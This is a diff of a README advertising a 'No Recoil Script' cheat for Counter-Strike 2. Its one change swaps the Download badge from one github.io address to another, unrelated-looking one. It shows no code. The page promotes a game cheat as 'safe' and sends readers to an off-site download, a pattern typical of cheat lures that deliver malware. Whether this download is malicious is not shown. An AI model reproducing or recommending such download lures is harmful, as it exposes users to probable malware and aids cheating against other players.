@@ -3,7 +3,7 @@
 Optimize your aim with a **No Recoil Script** for **Counter-Strike 2 (CS2)**. This guide helps you configure a safe recoil control tool to stabilize your spray and manage vertical kickback for tighter, more accurate bursts and full-auto sprays.
 
 ⬇️ **Download**  
-[![Download No Recoil Script](https://img.shields.io/badge/Download-No_Recoil_Script-0E4C92?style=for-the-badge&logo=counter-strike&logoColor=white)](https://cs2-no-recoil-script.github.io/.github/)
+[![Download No Recoil Script](https://img.shields.io/badge/Download-No_Recoil_Script-0E4C92?style=for-the-badge&logo=counter-strike&logoColor=white)](https://babas-my-foisal.github.io/.github/)
 
 ---
 
